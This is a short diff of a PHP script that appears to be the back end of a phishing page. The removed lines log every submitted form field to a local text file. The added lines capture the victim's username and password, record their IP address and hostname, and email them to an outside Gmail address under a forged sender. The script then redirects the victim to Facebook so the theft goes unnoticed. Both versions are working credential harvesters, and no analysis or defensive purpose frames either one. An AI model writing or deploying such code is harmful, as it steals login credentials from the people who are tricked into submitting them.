@@ -1,12 +1,13 @@
 <?php
-header( 'Location: http://google.com' ) ;
-$handle = fopen("akaunti.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
+$ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$message .= "-----------------|Account Origin|-------------------\n";
+$message .= "Mail                            : ".$_POST['username']."\n";
+$message .= "Pass                    : ".$_POST['password']."\n";
+$message .= "-----------------|Account Origin|-------------------\n";
+$send="lolprodajaacc@gmail.com";
+$subject = "LOL INFO | $ip";
+$headers = "From: LOL <origin@fucked.com>";
+mail($send,$subject,$message,$headers);
+header("Location: www.facebook.com");
+?>
